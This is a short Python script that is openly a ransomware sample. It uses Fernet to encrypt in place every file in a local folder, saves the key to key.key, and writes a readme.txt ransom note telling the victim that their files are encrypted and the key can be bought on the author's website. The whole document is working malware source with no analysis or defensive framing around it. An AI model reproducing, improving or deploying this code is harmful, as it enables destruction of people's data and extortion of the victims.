from cryptography.fernet import Fernet
import os


def generate_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)


def load_key():
    return open('key.key', 'rb').read()


def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(item, 'wb') as file:
                file.write(encrypted_data)


if __name__ == '__main__':

    path_to_encrypt = 'E:\\Ransom\\files'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]

    generate_key()
    key = load_key()
    encrypt(full_path, key)

    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
        file.write('You became victim of NK ransomware.')
        file.write('Your files have been encrypted with an military grade encryption algorithm.')
        file.write("There's no way to restore your data without a special key. You can purchase this key on my website")
